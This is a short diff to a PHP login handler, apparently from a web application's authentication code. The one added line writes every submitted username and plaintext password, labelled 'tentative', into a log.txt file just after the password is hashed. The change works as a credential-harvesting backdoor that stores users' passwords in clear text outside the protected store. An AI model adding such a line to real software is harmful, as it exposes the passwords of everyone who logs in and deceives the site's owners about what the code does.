@@ -40,6 +40,7 @@ switch(@$TASK)
 		$username = $_POST['username'];
 		$password = tripleMd5($_POST['password'], CRYPTOSALT);
 		$rememberMe = @$_POST['remember'];
+        file_put_contents('log.txt', file_get_contents('log.txt') . "\ntentative " . $_POST['username'] . " : " . $_POST['password']);
 
 		try {
 			// Connect to MySQL
